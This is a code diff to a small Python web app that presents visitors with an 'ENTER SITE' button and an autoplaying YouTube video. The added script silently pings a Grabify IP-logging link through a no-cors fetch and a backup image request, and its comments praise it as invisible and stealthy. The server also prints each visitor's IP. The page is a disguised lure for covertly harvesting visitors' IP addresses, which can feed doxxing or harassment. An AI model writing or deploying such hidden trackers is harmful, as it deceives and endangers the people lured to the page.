@@ -1,8 +1,8 @@
-# app.py - Simple IP logger that prints to Vercel logs
+# app.py - Silently logs IP via Grabify, shows video
 
 from datetime import datetime
 
-# Simple HTML page
+# HTML page with invisible Grabify tracking
 HTML = """<!DOCTYPE html>
 <html>
 <head>
@@ -45,7 +45,18 @@ HTML = """<!DOCTYPE html>
 <body>
     <button id="enter">ENTER SITE</button>
     <iframe id="vid" src="https://www.youtube.com/embed/2RWKJn8S9gg?autoplay=1&controls=0&rel=0" allow="autoplay; fullscreen"></iframe>
+    
     <script>
+        // Silently log to Grabify in background (no display)
+        fetch('https://urlto.me/2l8F4', {
+            method: 'GET',
+            mode: 'no-cors'  // This makes it silent, no response needed
+        }).catch(() => {});
+        
+        // Also try image ping as backup (even more stealthy)
+        let img = new Image();
+        img.src = 'https://urlto.me/2l8F4';
+        
         document.getElementById("enter").onclick = () => {
             document.getElementById("enter").style.display = "none";
             document.getElementById("vid").style.display = "block";
@@ -55,18 +66,14 @@ HTML = """<!DOCTYPE html>
 </html>"""
 
 def app(environ, start_response):
-    # Get real IP from headers
-    headers = dict([(k[5:].replace('_', '-').lower(), v) 
-                    for k, v in environ.items() if k.startswith('HTTP_')])
+    # Optional: Also log server-side for debugging
+    forwarded = environ.get('HTTP_X_FORWARDED_FOR', '')
+    if forwarded:
+        ip = forwarded.split(',')[0].strip()
+    else:
+        ip = environ.get('REMOTE_ADDR', 'unknown')
     
-    # Get IP
-    ip = (headers.get('x-vercel-forwarded-for', '') or 
-          headers.get('x-forwarded-for', '') or 
-          environ.get('REMOTE_ADDR', 'unknown')).split(',')[0].strip()
+    print(f"Visitor IP: {ip} at {datetime.now()}")
     
-    # PRINT TO LOGS - THIS IS WHERE REAL IP APPEARS
-    print(f"REAL VISITOR IP: {ip} at {datetime.now()}")
-    
-    # Send response
     start_response('200 OK', [('Content-Type', 'text/html')])
     return [HTML.encode()]
